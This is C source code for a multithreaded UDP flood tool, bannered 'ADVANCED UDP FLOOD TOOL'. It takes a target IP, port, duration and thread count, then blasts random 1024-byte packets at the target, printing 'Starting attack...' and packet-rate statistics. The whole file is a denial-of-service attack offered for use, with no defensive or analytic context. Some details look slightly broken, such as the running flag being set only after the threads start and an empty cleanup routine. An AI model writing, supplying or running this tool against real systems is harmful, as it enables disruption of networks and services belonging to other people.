#include <arpa/inet.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <signal.h>
#include <errno.h>

#define MAX_PACKET_SIZE 1024
#define SHA_LEN 32
#define MAX_PPS 100000
#define MAX_THREADS 5000
#define STATUS_UPDATE_INTERVAL 2

// Structure for thread data
typedef struct {
    int thread_id;
    struct sockaddr_in target;
    volatile unsigned long *packet_count;
    volatile int *running;
    int socket_fd;
} thread_data_t;

// Structure for program configuration
typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int thread_count;
    int packet_size;
    unsigned long total_packets;
    volatile int running;
} config_t;

// Global configuration
config_t config;

// Function prototypes
void print_banner(void);
void init_config(int argc, char *argv[]);
void validate_arguments(void);
void setup_signal_handlers(void);
void handle_signal(int sig);
void print_status(volatile unsigned long *packet_counts, int thread_count);
void *flood_thread(void *arg);
void cleanup(void);
unsigned long get_time_ms(void);

int main(int argc, char *argv[]) {
    pthread_t *threads = NULL;
    thread_data_t *thread_data = NULL;
    volatile unsigned long *packet_counts = NULL;
    unsigned long start_time, current_time, elapsed_time;
    
    print_banner();
    init_config(argc, argv);
    validate_arguments();
    setup_signal_handlers();
    
    printf("[+] Target: %s:%d\n", config.target_ip, config.target_port);
    printf("[+] Duration: %d seconds\n", config.duration);
    printf("[+] Threads: %d\n", config.thread_count);
    printf("[+] Packet size: %d bytes\n", config.packet_size);
    printf("[+] Starting attack...\n\n");
    
    // Allocate memory for threads and counters
    threads = malloc(config.thread_count * sizeof(pthread_t));
    thread_data = malloc(config.thread_count * sizeof(thread_data_t));
    packet_counts = malloc(config.thread_count * sizeof(unsigned long));
    
    if (!threads || !thread_data || !packet_counts) {
        perror("Memory allocation failed");
        cleanup();
        return EXIT_FAILURE;
    }
    
    // Initialize packet counters
    memset((void*)packet_counts, 0, config.thread_count * sizeof(unsigned long));
    
    // Create worker threads
    for (int i = 0; i < config.thread_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].target.sin_family = AF_INET;
        thread_data[i].target.sin_port = htons(config.target_port);
        thread_data[i].target.sin_addr.s_addr = inet_addr(config.target_ip);
        thread_data[i].packet_count = &packet_counts[i];
        thread_data[i].running = &config.running;
        
        // Create socket for this thread
        thread_data[i].socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (thread_data[i].socket_fd < 0) {
            perror("Socket creation failed");
            cleanup();
            return EXIT_FAILURE;
        }
        
        // Set socket to non-blocking to prevent hangs
        int flags = fcntl(thread_data[i].socket_fd, F_GETFL, 0);
        fcntl(thread_data[i].socket_fd, F_SETFL, flags | O_NONBLOCK);
        
        if (pthread_create(&threads[i], NULL, flood_thread, (void*)&thread_data[i]) != 0) {
            perror("Thread creation failed");
            cleanup();
            return EXIT_FAILURE;
        }
    }
    
    config.running = 1;
    start_time = get_time_ms();
    
    // Main control loop
    while (config.running) {
        sleep(STATUS_UPDATE_INTERVAL);
        print_status(packet_counts, config.thread_count);
        
        current_time = get_time_ms();
        elapsed_time = (current_time - start_time) / 1000;
        
        if (elapsed_time >= config.duration) {
            config.running = 0;
            break;
        }
    }
    
    // Wait for threads to finish
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
        close(thread_data[i].socket_fd);
    }
    
    // Calculate statistics
    unsigned long total_packets = 0;
    for (int i = 0; i < config.thread_count; i++) {
        total_packets += packet_counts[i];
    }
    
    printf("\n[+] Attack completed!\n");
    printf("[+] Total packets sent: %lu\n", total_packets);
    printf("[+] Average PPS: %.2f\n", (float)total_packets / config.duration);
    
    cleanup();
    return EXIT_SUCCESS;
}

void print_banner(void) {
    printf("=========================================\n");
    printf("        ADVANCED UDP FLOOD TOOL\n");
    printf("=========================================\n");
}

void init_config(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        printf("Example: %s 192.168.1.100 80 60 10\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_port = atoi(argv[2]);
    config.duration = atoi(argv[3]);
    config.thread_count = atoi(argv[4]);
    config.packet_size = MAX_PACKET_SIZE;
    config.total_packets = 0;
    config.running = 0;
}

void validate_arguments(void) {
    if (config.target_port < 1 || config.target_port > 65535) {
        fprintf(stderr, "Error: Port must be between 1 and 65535\n");
        exit(EXIT_FAILURE);
    }
    
    if (config.duration < 1) {
        fprintf(stderr, "Error: Duration must be at least 1 second\n");
        exit(EXIT_FAILURE);
    }
    
    if (config.thread_count < 1 || config.thread_count > MAX_THREADS) {
        fprintf(stderr, "Error: Thread count must be between 1 and %d\n", MAX_THREADS);
        exit(EXIT_FAILURE);
    }
    
    struct in_addr addr;
    if (inet_pton(AF_INET, config.target_ip, &addr) != 1) {
        fprintf(stderr, "Error: Invalid IP address format\n");
        exit(EXIT_FAILURE);
    }
}

void setup_signal_handlers(void) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
}

void handle_signal(int sig) {
    printf("\n[!] Received signal %d, shutting down...\n", sig);
    config.running = 0;
}

void print_status(volatile unsigned long *packet_counts, int thread_count) {
    static int update_count = 0;
    unsigned long total = 0;
    
    for (int i = 0; i < thread_count; i++) {
        total += packet_counts[i];
    }
    
    printf("[%02d] Total packets: %lu | Current PPS: %.2f\n", 
           ++update_count, total, (float)total / ((update_count) * STATUS_UPDATE_INTERVAL));
}

void *flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    char packet[MAX_PACKET_SIZE];
    int packet_size = config.packet_size;
    
    // Fill packet with random data
    for (int i = 0; i < packet_size; i++) {
        packet[i] = rand() % 256;
    }
    
    while (*(data->running)) {
        ssize_t sent = sendto(data->socket_fd, packet, packet_size, 0,
                             (struct sockaddr *)&data->target, sizeof(data->target));
        
        if (sent > 0) {
            (*(data->packet_count))++;
        } else if (errno != EAGAIN && errno != EWOULDBLOCK) {
            // Real error occurred
            break;
        }
    }
    
    return NULL;
}

void cleanup(void) {
    // Cleanup logic would go here
    printf("[+] Cleanup completed\n");
}

unsigned long get_time_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (ts.tv_sec * 1000) + (ts.tv_nsec / 1000000);
}